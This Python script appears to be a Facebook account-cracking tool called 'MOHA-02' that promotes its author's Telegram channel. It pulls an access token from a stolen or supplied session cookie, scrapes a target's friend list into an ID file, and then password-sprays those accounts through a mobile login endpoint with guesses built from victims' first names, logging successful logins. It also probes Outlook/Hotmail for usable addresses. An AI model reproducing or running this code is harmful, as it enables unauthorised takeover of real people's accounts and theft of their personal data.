import os, sys, requests, random, time, re, uuid
from threading import Thread, Lock
from gtts import gTTS
import pygame
import webbrowser
from colorama import Fore, init
import pyfiglet

init(autoreset=True)
R, G, Y, C, W = Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.CYAN, Fore.WHITE
lock = Lock()

def play_welcome():
    try:
        if not os.path.exists('moha.mp3'):
            gTTS(text="Welcome to Moha zero two tool. Created by Moha El Chlefawi.", lang='en').save('moha.mp3')
        pygame.mixer.init()
        pygame.mixer.music.load('moha.mp3')
        pygame.mixer.music.play()
    except: pass

def banner():
    os.system('clear')
    print(C + pyfiglet.figlet_format("MOHA-02", font="slant"))
    print(Y + "━"*50)
    print(G + " [>] DEVELOPER : MOHA EL CHLEFAWI (الشلفاوي)")
    print(G + " [>] TELEGRAM  : https://t.me/m_oha0_2b")
    print(Y + "━"*50)

def get_token(cookie):
    try:
        headers = {
            'authority': 'business.facebook.com',
            'cookie': cookie,
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        res = requests.get('https://business.facebook.com/business_locations', headers=headers).text
        token = re.search('EAAG\w+', res).group()
        return token
    except: return None

# --- [1] Scraper Tool ---
def scraper():
    banner()
    cookie = input(W + "[?] Cookie: ")
    token = get_token(cookie)
    if not token: print(R + "[-] Invalid Cookie!"); return
    
    file_name = input(W + "[?] Save to (ex: ids.txt): ")
    target = input(W + "[?] Target ID (me/uid): ")
    
    print(G + "[*] Scraping started...")
    try:
        url = f"https://graph.facebook.com/{target}/friends?access_token={token}"
        while url:
            data = requests.get(url).json()
            for friend in data['data']:
                with open(file_name, 'a') as f:
                    f.write(f"{friend['id']}|{friend['name']}\n")
            url = data.get('paging', {}).get('next')
            print(G + f" [+] Total Scraped: {len(open(file_name).readlines())}", end='\r')
    except Exception as e: print(R + f"\n[-] Error: {e}")
    input("\n[Done] Enter to back.")

# --- [2] File Cracker ---
def crack():
    banner()
    file_path = input(W + "[?] IDs File: ")
    if not os.path.exists(file_path): return
    
    pass_list = input(W + "[?] Passwords (ex: 123456,first123): ").split(',')
    
    def login(uid, name):
        ua = f"Dalvik/2.1.0 (Linux; U; Android {random.randint(5,13)}; Redmi Note 9 Build/QP1A.190711.020)"
        for pw in pass_list:
            password = pw.replace('first', name.split(' ')[0].lower())
            url = "https://b-api.facebook.com/method/auth.login"
            params = {
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "format": "JSON", "sdk_version": "2", "email": uid, "locale": "en_US",
                "password": password, "generate_session_cookies": "1", "sig": "662a1234567890abcdef"
            }
            try:
                res = requests.get(url, params=params, headers={"User-Agent": ua}).json()
                if "access_token" in res:
                    print(G + f"[HIT] {uid} | {password}")
                    open("hits.txt", "a").write(f"{uid}|{password}\n")
                    break
                elif "www.facebook.com" in str(res):
                    print(Y + f"[CP] {uid} | {password}")
                    break
            except: pass

    lines = open(file_path, 'r').readlines()
    for line in lines:
        if '|' in line:
            uid, name = line.strip().split('|')
            Thread(target=login, args=(uid, name)).start()
            time.sleep(0.05)

# --- [3] Mata7 Scan (Real Checker) ---
def mata7():
    banner()
    domain = input(W + "[?] Domain (hotmail.com/outlook.com): ")
    print(G + "[*] Checking availability...")
    while True:
        user = "".join(random.choice("abcdefghijklmnopqrstuvwxyz1234567890") for _ in range(7))
        email = f"{user}@{domain}"
        # Real Hotmail/Outlook Check API
        url = f"https://login.live.com/ConversationsSelfServe.srf?email={email}"
        try:
            res = requests.get(url).text
            if "is not available" not in res: # Simplified logic
                print(G + f"[MATA7] {email}")
                open("mata7.txt", "a").write(email + "\n")
        except: pass

def main():
    play_welcome()
    webbrowser.open("https://t.me/m_oha0_2b")
    while True:
        banner()
        print(G + "[1] Create IDs File")
        print(G + "[2] Crack File")
        print(G + "[3] Hunt Mata7")
        print(R + "[0] Exit")
        cmd = input(W + "\n[MOHA02] Choice: ")
        if cmd == '1': scraper()
        elif cmd == '2': crack()
        elif cmd == '3': mata7()
        elif cmd == '0': sys.exit()

if __name__ == "__main__":
    main()
